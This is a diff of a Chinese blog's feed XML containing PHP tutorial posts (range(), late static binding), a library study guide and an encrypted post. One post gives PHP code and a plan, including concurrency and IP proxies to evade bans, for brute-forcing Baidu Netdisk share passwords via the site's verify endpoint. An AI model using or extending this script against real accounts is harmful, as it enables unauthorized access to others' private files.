+<h1 id="用法三-：-start-和-end-如果有一个是整数或者浮点数"><a href="#用法三-：-start-和-end-如果有一个是整数或者浮点数" class="headerlink" title="用法三 ： $start 和 $end 如果有一个是整数或者浮点数"></a>用法三 ： <code>$start</code> 和 <code>$end</code> 如果有一个是整数或者浮点数</h1><p><code>$start</code> 和 <code>$end</code> 如果有一个是整数或者浮点数，而另一个是字符串，那么会将另一个也转换为整数或者浮点数</p>
+<ol>
+<li><p>一个是整数而另一个是字符串整数，那么会将另一个转换为整数，结果和都是整数是类似的</p>
+<pre><code class="php">// array(0, 2, 4, 6, 8, 10, 12)
+foreach (range(0, &#39;12&#39;，2) as $number) {
+ echo $number;
+}
+</code></pre>
+</li>
+<li><p>一个是浮点数而另一个是字符串整数或浮点数，那么会将另一个转换为浮点数，结果和都是整数是类似的</p>
+</li>
+</ol>
+<pre><code class="php">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)
+foreach (range(12.8, &#39;2&#39;, 2) as $number) {
+    echo $number;
+}
+</code></pre>
+<h1 id="用法四-：-start-和-end-如果全部是字符串"><a href="#用法四-：-start-和-end-如果全部是字符串" class="headerlink" title="用法四 ： $start 和 $end 如果全部是字符串"></a>用法四 ： <code>$start</code> 和 <code>$end</code> 如果全部是字符串</h1><p><code>$start</code> 和 <code>$end</code> 如果全部是字符串，那么会取两个字符串的第一个字母，并按照 ASCII 字母顺序表，取步长对应的值</p>
+<ol>
+<li><p>如果 <code>$start</code> 和 <code>$end</code> 都是单个字母，那么直接按照 ASCII 顺序取步长的值</p>
+<pre><code class="php">// array(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;);
+foreach (range(&#39;a&#39;, &#39;i&#39;) as $letter) {
+ echo $letter;
+}
+</code></pre>
+</li>
+<li><p>如果按照 ASCII 顺序，<code>$start</code> 大于 <code>$end</code> ，那么会反向步长取值，这个和整数是类似的</p>
+<pre><code class="php">// array(&#39;c&#39;, &#39;b&#39;, &#39;a&#39;);
+foreach (range(&#39;c&#39;, &#39;a&#39;) as $letter) {
+ echo $letter;
+}
+</code></pre>
+</li>
+<li><p>如果 <code>$start</code> 或 <code>$end</code> 任意一个字符串长度大于 1 ，那么只会取第一个字母</p>
+<pre><code class="php">// array(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;);
+foreach (range(&#39;abc&#39;, &#39;i&#39;) as $letter) {
+ echo $letter;
+}
+</code></pre>
+</li>
+<li><p>如果两个都是字符串，而其中一个是整数字符串或者浮点数字符串，那也会当作普通字符串来处理</p>
+<pre><code class="php">echo implode(&quot;&quot;,range(&quot;9 &quot;,&quot;Q&quot;));  //space after the 9
+// prints 9:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQ
+</code></pre>
+</li>
+</ol>
+<blockquote>
+<p>那么，我们如何使用<code>range()</code>来输出 <a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">ASCII</a> 的所有可见字符呢？</p>
+<pre><code class="php">&lt;?php
+echo json_encode(range(&#39; &#39;, &#39;~&#39;));
+</code></pre>
+<p>输出是</p>
+<pre><code>[&quot; &quot;,&quot;!&quot;,&quot;\&quot;&quot;,&quot;#&quot;,&quot;$&quot;,&quot;%&quot;,&quot;&amp;&quot;,&quot;&#39;&quot;,&quot;(&quot;,&quot;)&quot;,&quot;*&quot;,&quot;+&quot;,&quot;,&quot;,&quot;-&quot;,&quot;.&quot;,&quot;\/&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;:&quot;,&quot;;&quot;,&quot;&lt;&quot;,&quot;=&quot;,&quot;&gt;&quot;,&quot;?&quot;,&quot;@&quot;,&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;,&quot;I&quot;,&quot;J&quot;,&quot;K&quot;,&quot;L&quot;,&quot;M&quot;,&quot;N&quot;,&quot;O&quot;,&quot;P&quot;,&quot;Q&quot;,&quot;R&quot;,&quot;S&quot;,&quot;T&quot;,&quot;U&quot;,&quot;V&quot;,&quot;W&quot;,&quot;X&quot;,&quot;Y&quot;,&quot;Z&quot;,&quot;[&quot;,&quot;\\&quot;,&quot;]&quot;,&quot;^&quot;,&quot;_&quot;,&quot;`&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;{&quot;,&quot;|&quot;,&quot;}&quot;,&quot;~&quot;]
+</code></pre></blockquote>
+<h1 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h1><p><a href="https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html" target="_blank" rel="noopener">https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html</a></p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[百度网盘分享密码暴力破解]]></title>
+      <url>https://blog.palemoky.top/2019/08/26/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%88%86%E4%BA%AB%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+      <content type="html"><![CDATA[<p>前几天阅读了一篇<a href="https://thezerohack.com/hack-any-instagram" target="_blank" rel="noopener">文章</a>，作者通过枚举重置密码的手机验证码来修改任意用户的账号密码。这种方式被普遍应用，但我们确实比较少的关心这可能存在漏洞，纯数字的验证码只要在失效前通过程序枚举很快就能被破解。受此启发，也想尝试下百度网盘的分享密码破解试验。</p>
+<p>百度网盘的分享密码为4个字符，因此，我们可以通过调用认证接口来暴力破解。</p>
+<p>通过 Chrome 的网络请求分析，结合 POSTMAN 模拟请求，我们得知，网盘密码认证主要参数有</p>
+<ol>
+<li>分享链接识别码</li>
+<li>毫秒时间戳</li>
+<li>http 的 refer 头</li>
+<li>post 方式发送的密码</li>
+</ol>
+<p>于是，我们有了以下的一段代码：</p>
+<pre><code class="php">&lt;?php
+function crackBaiduNetdiskPwd($url)
+{
+    $shareCode = ltrim(strstr($url, &#39;/1&#39;),&#39;/1&#39;);
+    $baseUrl = &#39;https://pan.baidu.com/share/verify?&#39;;
+    $get_params = [
+        &#39;surl&#39; =&gt; $shareCode,
+        &#39;t&#39; =&gt; intval(microtime(true) * 1000),
+        &#39;channel&#39; =&gt; &#39;chunlei&#39;,
+        &#39;web&#39; =&gt; 1,
+        &#39;clienttype&#39; =&gt; 0,
+        &#39;app_id&#39; =&gt; 123456,
+        &#39;bdstoken&#39; =&gt; &#39;&#39;,
+        &#39;logid&#39; =&gt; &#39;MTU2Njc5MTgzODkyNzAuNjM3NzgzODMwMzQ1MjE3NQ==&#39;
+    ];
+
+    $requestUrl = $baseUrl.http_build_query($get_params);
+
+    $pwd = &#39;77wk&#39;;//todo 生成密码
+    $post_params = [
+        &#39;pwd&#39; =&gt; $pwd,
+        &#39;vscode&#39; =&gt; &#39;&#39;,
+        &#39;vscode_str&#39; =&gt; &#39;&#39;
+    ];
+
+    $ch = curl_init($requestUrl);
+    curl_setopt_array(
+        $ch,
+        [
+            CURLOPT_POST =&gt; true,
+            CURLOPT_POSTFIELDS =&gt; http_build_query($post_params),//设定 POST 参数内容
+            // CURLOPT_FOLLOWLOCATION =&gt; true,//跟随重定向地址
+            // CURLOPT_AUTOREFERER =&gt; true,
+            CURLOPT_RETURNTRANSFER =&gt; true,//将curl_exec()获取的信息以字符串返回，而不是直接输出。
+            CURLOPT_USERAGENT =&gt; &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39;,
+            CURLOPT_REFERER =&gt; &#39;https://pan.baidu.com/share/init?surl=&#39;.$shareCode//必填项
+        ]
+    );
+    //todo 并发请求
+    $response = curl_exec($ch);
+
+    if(! json_decode($response)-&gt;errno) {
+        echo &#39;破解成功，密码为：&#39;.$pwd;
+    }
+
+    curl_close($ch);
+}
+
+crackBaiduNetdiskPwd(&#39;https://pan.baidu.com/s/1gftmNyb&#39;);
+</code></pre>
+<p>至此，单次请求已经成功，但剩余的工作还有：</p>
+<ol>
+<li>我们需要生成纯字母、字母数字、纯数字三种类型的密码，且这三类的权重依次降低，三类中的重复密码（如：<code>aaaa</code>，<code>6666</code>）权重最低</li>
+<li>给定密码区间段和类型，如何生成指定长度的密码，如，怎样生成<code>aaaa ~ zzzz</code>的密码？（现有思路：将字母转换为 ASCII 对应的数字，共 4 个位，将其转换为数组。如果第0位值达到<code>z</code>，则向高位进位，低位归位处理）</li>
+<li>php 实现并发请求</li>
+<li>添加IP代理，避免单一IP请求被封禁</li>
+<li>添加日志，支持断点续破</li>
+<li>记录每次破解的耗时与次数，用于后期分析</li>
+</ol>
+<p>—2019-09-19更新—</p>
+<p>生成<code>aaaa ~ zzzz</code>的密码：</p>
+<pre><code class="php">function getAlphabet() {
+    for ($i = &#39;aaaa&#39;; $i &lt; &#39;zzzz&#39;; $i++) {
+        yield $i;
+
+        if (&#39;zzzy&#39; === $i) {
+            return yield get4Z();
+        }
+    }
+}
+
+function get4Z() {
+    return &#39;zzzz&#39;;
+}
+
+foreach (getAlphabet() as $letter) {
+    echo $letter;
+}
+</code></pre>
+<p>生成字母数字的密码：</p>
+<pre><code class="php">function getAlphanumeric() {
+    //todo 
+}
+</code></pre>
+<hr>
+<ol>
+<li>如果需要获取更高精度的时间戳，可以调整<code>php.ini</code>中的<code>precision</code>的值。</li>
+<li><code>curl_setopt_array</code>中的 key 是预设常量，如果写作字符串（如<code>&#39;CURLOPT_POSTFIELDS&#39;</code>），则会有<code>curl_setopt_array(): Array keys must be CURLOPT constants or equivalent integer values in</code>的错误</li>
+</ol>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[【转】对PHP后期静态绑定的理解]]></title>
+      <url>https://blog.palemoky.top/2019/08/16/%E3%80%90%E8%BD%AC%E3%80%91%E5%AF%B9PHP%E5%90%8E%E6%9C%9F%E9%9D%99%E6%80%81%E7%BB%91%E5%AE%9A%E7%9A%84%E7%90%86%E8%A7%A3/</url>
+      <content type="html"><![CDATA[<h1 id="什么是后期静态绑定"><a href="#什么是后期静态绑定" class="headerlink" title="什么是后期静态绑定"></a>什么是后期静态绑定</h1><p>在看一些框架源码或者是某个项目的代码时，经常能看到后期静态绑定的用法，比如下面这段：</p>
+<pre><code class="php">public static function getInstance()
+{
+    if (is_null(static::$instance)) {
+        static::$instance = new static;
+    }
+
+    return static::$instance;
+}
+</code></pre>
+<p>这里用到的就是后期静态绑定。那么，什么是后期静态绑定？</p>
+<p>“后期绑定” 的意思是说，<code>static::</code>不再被解析为定义当前方法所在的类，而是在运行时计算的。这里要先说两个概念，一个是转发调用，另一个是非转发调用。</p>
+<ul>
+<li><p>转发调用<br>所谓的 “转发调用”（forwarding call）指的是通过以下几种方式进行的静态调用：<code>self::</code>, <code>parent::</code>, <a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener"><code>static::</code></a> 以及 <a href="https://www.php.net/manual/zh/function.forward-static-call.php" target="_blank" rel="noopener"><code>forward_ static _call()</code></a>。即<strong>在进行静态调用时未指明类名的调用属于转发调用</strong>。</p>
+</li>
+<li><p>非转发调用<br>非转发调用其实就是明确指定类名的静态调用（<code>foo::bar()</code>）和非静态调用 (<code>$foo-&gt;bar()</code>)。即<strong>明确地指定类名的静态调用和非静态调用</strong>。</p>
+</li>
+</ul>
+<p>顾名思义，<strong>非转发调用前面有类名所以调用的函数一定是属于 “这个类的”，不需要转到别的类。转发调用就是由于前期的静态绑定导致在后面调用静态方法时可能 “转发到其他的类”</strong></p>
+<p>在 PHP 的官方文档里，对于后期静态绑定是这样说的：后期静态绑定工作原理是存储了在上一个 “非转发调用”（non-forwarding call）中的类名。意思是<strong>当我们调用一个转发调用的静态调用时，实际调用的类是上一个非转发调用的类</strong>。</p>
+<p>来看两个例子：</p>
+<p>例子1：</p>
+<pre><code class="php">class A {
+    public static function who() {
+        echo __CLASS__;
+    }
+    public static function test() {
+        static::who(); // 后期静态绑定从这里开始
+    }
+}
+class B extends A {
+    public static function who() {
+        echo __CLASS__;
+    }
+}
+
+B::test();
+</code></pre>
+<p>以上代码会输出</p>
+<pre><code class="php">B
+</code></pre>
+<p>例子2：</p>
+<pre><code class="php">class A {
+    public static function foo() {
+        static::who();
+    }
+
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+
+class B extends A {
+    public static function test() {
+        A::foo();
+        parent::foo();
+        self::foo();
+    }
+
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+
+class C extends B {
+    public static function who() {
+        echo __CLASS__.&quot;\n&quot;;
+    }
+}
+
+C::test();
+</code></pre>
+<p>以上代码会输出</p>
+<pre><code>A
+C
+C
+</code></pre><p>在这里主要分析下例 2。</p>
+<ol>
+<li><code>C::test()</code>，这是一个非转发调用，因为：：前面有类名 C。</li>
+<li>进入 <code>test()</code> 方法，有三个静态调用 <code>A::foo()</code>,<code>parent::foo()</code>,<code>self::foo()</code>, 对于这三个静态调用来说，他们的非转发调用类就是 C。</li>
+<li>现在执行 <code>A::foo()</code>, 这是一个非转发调用。<code>A::foo()</code> 中的代码是 <code>static::who()</code>, 这是一个转发调用，对于这个转发调用来说他的非转发调用类就是不再是 C 而是 A（因为之前执行了 <code>A::foo()</code>）。因此执行的结果为 A</li>
+<li>现在执行 <code>parent::foo()</code>, 这是一个转发调用，转发到哪里呢？就是它的上一个非转发调用的类，也就是类 C（在步骤 2 中提到的）。在这里一定要注意虽然在这之前执行了 <code>A::foo()</code>, 但是 <code>parent::foo()</code> 的上一个非转发调用的类任然是类 C。因此执行的结果是 C.</li>
+<li>现在执行 <code>self::foo()</code>, 这个和 <code>parent::foo()</code> 一样都是转发调用，因此也输出 C。</li>
+</ol>
+<blockquote>
+<p>想要搞清楚后期静态绑定，就是要知道 <code>static</code> 是哪个类。</p>
+</blockquote>
+<h1 id="使用后期静态绑定的好处"><a href="#使用后期静态绑定的好处" class="headerlink" title="使用后期静态绑定的好处"></a>使用后期静态绑定的好处</h1><p>后期静态绑定目前我看到较多的是用于对象实例化中，在实例化对象时，<code>static</code> 会根据运行时调用的类来决定实例化对象，而 <code>self</code> 则是根据所在位置的类来决定实例化对象。当我们只想实例化子类，并且不希望后续在对子类的使用中由于父类的变化对子类产生影响时，后期静态绑定就能发挥它的作用了。</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[国家图书馆自习不完全指南]]></title>
       <url>https://blog.palemoky.top/2019/07/25/%E5%9B%BD%E5%AE%B6%E5%9B%BE%E4%B9%A6%E9%A6%86%E8%87%AA%E4%B9%A0%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/</url>
       <content type="html"><![CDATA[<p>无论是工作之余充电，还是赶制论文，国家图书馆都是一个非常好的选择，一方面是有很多免费的自习空位，另一方面在这样的氛围中容易集中注意力、高效学习，最重要的是，借阅区的书籍只要不带出馆区，都可以免费借阅。但国图也有一些缺点：比如免费 WiFi 由于使用人数较多，速度非常慢，所以如果你非常依赖网络，建议使用手机热点。</p>
@@ -2792,7 +3649,7 @@ function gen_stoken() {
     <entry>
       <title><![CDATA[下雪了]]></title>
       <url>https://blog.palemoky.top/2016/12/17/%E4%B8%8B%E9%9B%AA%E4%BA%86/</url>
-      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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